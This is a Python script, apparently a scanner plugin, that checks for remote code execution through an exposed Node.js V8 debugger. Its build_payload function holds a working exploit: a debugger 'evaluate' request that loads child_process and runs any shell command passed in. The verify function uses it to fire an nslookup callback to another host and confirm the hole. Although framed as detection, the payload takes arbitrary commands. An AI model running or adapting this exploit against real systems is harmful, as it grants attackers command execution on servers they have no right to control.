# coding:utf-8

import socket
import string
import random
import time
import requests

def build_payload(cmd=""):
        payload = u'''{
            "seq": 1,
            "type": "request",
            "command": "evaluate",
            "arguments": {
                "expression": "(function(){var require=global.require||global.process.mainModule.constructor._load;if(!require)return;var exec=require(\\"child_process\\").exec;function execute(command,callback){exec(command,function(error,stdout,stderr){callback(stdout)})}execute(\\"''' + cmd + '''\\",console.log)})()",
                "global": true,
                "maxStringLength": -1
            }
        }'''
        data = u"Content-Length: {}\r\n\r\n".format(len(payload)) + payload
        return data.encode('utf-8')


def ip_address(ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((ip, port))
        (addr, port) = sock.getsockname()
        sock.close()
        return addr


def dnslog_check(server, hash_str):
        url = "http://{}:8088/{}".format(server, hash_str)
        try:
                content = requests.get(url, timeout=5).text
        except Exception as e:
                return False
        else:
                if 'YES' in content:
                        return True
        return False



def random_str(length):
        pool = string.digits + string.ascii_lowercase
        return "".join(random.choice(pool) for _ in range(length))

def verify(protocol,ip,port):
        url = protocol+'://'+ip+':'+str(port)
        print('testing if node.js V8 debugger remote code exection vul')
        socket.setdefaulttimeout(10)
        server = ip_address(ip, int(port))
        check_str = random_str(16)
        try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, int(port)))
                command = "nslookup {} {}".format(check_str, server)
                sock.send(build_payload(command))
        except Exception as e:
                pass
        else:
                time.sleep(2)
                if dnslog_check(server, check_str):
                        msg = 'There is node.js V8 debugger remote code exection vul on url: ' +url+' .'
                        number = 'v58'
                        return True,url,number,msg
        msg = 'There is no node.js V8 debugger remote code exection vul on url: ' +url+' .'
        number = 'v0'
        return False,url,number,msg



